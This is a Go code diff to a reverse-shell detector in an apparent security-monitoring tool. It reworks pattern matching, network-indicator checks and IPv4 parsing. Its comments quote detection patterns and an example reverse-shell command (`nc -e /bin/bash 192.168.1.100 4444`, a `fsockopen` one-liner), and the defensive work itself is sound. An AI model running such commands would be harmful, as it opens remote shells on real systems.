@@ -310,42 +310,59 @@ func DetectReverseShells(processes []Process) []ProcessThreat {
 	for _, proc := range processes {
 		cmdLower := strings.ToLower(proc.Command)
 
-		for _, pattern := range reverseShellPatterns {
-			if strings.Contains(cmdLower, strings.ToLower(pattern.pattern)) {
-				// Additional check: the interpreter one-liner patterns
-				// (python -c, perl -e, ruby -e, php -r, ...) are only a threat
-				// when the command actually carries a network indicator. Require
-				// a real one — a socket/tcp/udp/connect keyword, an IP, or a
-				// host:port endpoint — NOT a bare ':' (issue #842): agent Bash
-				// tools wrap commands in a shell-snapshot line and quote code
-				// that almost always contains ':' (PATH entries like
-				// /usr/bin:/bin, dict literals like {"k": v}, URLs, log text),
-				// so a bare-':' check turned every agent-run `python -c` /
-				// `perl -e` / `ruby -e` / `php -r` into a kill-on-sight false
-				// positive.
-				if isNetworkRelated(cmdLower) || pattern.pattern == "bash -i" || pattern.pattern == "sh -i" {
-					threats = append(threats, ProcessThreat{
-						PID:        proc.PID,
-						Command:    proc.Command,
-						User:       proc.User,
-						Pattern:    pattern.pattern,
-						Indicators: pattern.indicators,
-						Class:      pattern.class,
-					})
-					break
-				}
+		// The interpreter one-liner patterns (python -c, perl -e, ruby -e,
+		// php -r, ...) are only a threat when the command actually carries a
+		// network indicator. Require a real one — a socket/tcp/udp keyword, an
+		// IP, or a host:port endpoint — NOT a bare ':' (issue #842): agent Bash
+		// tools wrap commands in a shell-snapshot line and quote code that
+		// almost always contains ':' (PATH entries like /usr/bin:/bin, dict
+		// literals like {"k": v}, URLs, log text), so a bare-':' check turned
+		// every agent-run `python -c` / `perl -e` / `ruby -e` / `php -r` into a
+		// kill-on-sight false positive.
+		networkRelated := isNetworkRelated(cmdLower)
+
+		// Pick the strongest matching pattern rather than the first one in the
+		// table. A command that matches an interpreter one-liner (downgradeable
+		// via the reverse_shell_one_liners knob) AND an unambiguous indicator
+		// (socket.socket, fsockopen, EXEC:, ...) must be classified STRONG, so
+		// the knob can never downgrade a genuine reverse shell that carries an
+		// always-critical indicator. Without this, table order + first-match
+		// would tag `php -r $s=fsockopen(...)` as a one-liner and "off"/"warn"
+		// would suppress it (code-review #842).
+		matched := -1
+		for i := range reverseShellPatterns {
+			p := &reverseShellPatterns[i]
+			if !strings.Contains(cmdLower, strings.ToLower(p.pattern)) {
+				continue
 			}
+			// bash -i / sh -i are damning on their own; every other pattern
+			// needs a network indicator.
+			if !networkRelated && p.pattern != "bash -i" && p.pattern != "sh -i" {
+				continue
+			}
+			if matched < 0 {
+				matched = i
+			}
+			if p.class == ReverseShellClassStrong {
+				matched = i
+				break // strong wins outright — stop looking
+			}
+		}
+		if matched >= 0 {
+			p := reverseShellPatterns[matched]
+			threats = append(threats, ProcessThreat{
+				PID:        proc.PID,
+				Command:    proc.Command,
+				User:       proc.User,
+				Pattern:    p.pattern,
+				Indicators: p.indicators,
+				Class:      p.class,
+			})
 		}
 	}
 
 	return threats
 }
-
-// ipv4Re matches a dotted-quad IPv4 address anywhere in a command, including
-// when embedded in punctuation such as a Python tuple `("10.0.0.1",4444)`.
-// The word boundaries keep it from matching version strings inside a longer
-// dotted run (e.g. it won't fire on the "1.2.3" of "1.2.3.4.5"-style noise).
-var ipv4Re = regexp.MustCompile(`\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b`)
 
 // hostPortRe matches an explicit network endpoint — an IPv4 address or a
 // dotted hostname (needs a TLD-like final label) followed by ':' and a numeric
@@ -356,19 +373,45 @@ var hostPortRe = regexp.MustCompile(`(?:\d{1,3}(?:\.\d{1,3}){3}|[a-z0-9][a-z0-9-
 
 // isNetworkRelated reports whether a reverse-shell candidate command actually
 // carries a network indicator. It deliberately does NOT treat a bare ':' as an
-// indicator — see the caller and issue #842.
+// indicator, nor a bare "connect" substring — both fire on benign agent
+// one-liners (e.g. db.connect(), a PATH with ':') and re-open issue #842. Real
+// reverse shells in these interpreters always carry a socket/tcp/udp keyword,
+// an IP, or a host:port endpoint alongside any connect() call.
 func isNetworkRelated(cmdLower string) bool {
 	return strings.Contains(cmdLower, "sock") || // socket, fsockopen, tcpsocket, ...
 		strings.Contains(cmdLower, "tcp") ||
 		strings.Contains(cmdLower, "udp") ||
-		strings.Contains(cmdLower, "connect") ||
 		containsIPPattern(cmdLower) ||
 		hostPortRe.MatchString(cmdLower)
 }
 
-// containsIPPattern checks if command contains an IPv4 address pattern.
+// containsIPPattern reports whether the command contains a whitespace-delimited
+// dotted-quad IPv4 address (e.g. the `192.168.1.100` of `nc -e /bin/bash
+// 192.168.1.100 4444`). It matches only standalone tokens and validates each
+// octet is 0–255, so a dotted number glued into other text — a quoted version
+// string like "1.2.3.4" in a benign one-liner's output — is not mistaken for an
+// endpoint (code-review #842). IPs embedded in punctuation inside a real reverse
+// shell (e.g. a Python `("10.0.0.1",4444)` tuple) still trip isNetworkRelated
+// via the accompanying socket keyword or the host:port form.
 func containsIPPattern(cmd string) bool {
-	return ipv4Re.MatchString(cmd)
+	for _, part := range strings.Fields(cmd) {
+		octets := strings.Split(part, ".")
+		if len(octets) != 4 {
+			continue
+		}
+		valid := true
+		for _, octet := range octets {
+			n, err := strconv.Atoi(octet)
+			if err != nil || n < 0 || n > 255 {
+				valid = false
+				break
+			}
+		}
+		if valid {
+			return true
+		}
+	}
+	return false
 }
 
 // DetectProcessCountSpike checks whether the total number of processes in the
